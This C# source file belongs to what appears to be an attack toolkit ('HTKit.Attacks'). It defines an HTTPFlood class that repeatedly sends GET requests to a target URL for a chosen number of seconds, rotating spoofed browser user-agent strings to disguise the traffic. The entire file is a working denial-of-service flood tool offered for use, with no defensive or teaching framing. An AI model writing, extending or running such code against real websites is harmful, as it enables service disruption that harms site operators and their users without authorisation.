namespace HTKit.Attacks;

public class HTTPFlood
{
    private static readonly List<string> UserAgents = new List<string>
    {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    };

    public void Start(string url, int time = 30)
    {
        string targetUrl = url;
        int timeLimitInSeconds = time;

        using (HttpClient client = new HttpClient())
        {
            client.Timeout = TimeSpan.FromSeconds(1);

            DateTime endTime = DateTime.Now.AddSeconds(timeLimitInSeconds);

            Random random = new Random();

            while (DateTime.Now < endTime)
            {
                try
                {
                    string userAgent = UserAgents[random.Next(UserAgents.Count)];
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(userAgent);

                    HttpResponseMessage response = client.GetAsync(targetUrl).Result;
                    response.EnsureSuccessStatusCode();

                    string content = response.Content.ReadAsStringAsync().Result;
                    Console.WriteLine($"Response received: {content.Substring(0, Math.Min(100, content.Length))}");

                    System.Threading.Thread.Sleep(60);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Request failed: {ex.Message}");
                }
            }
        }
    }
}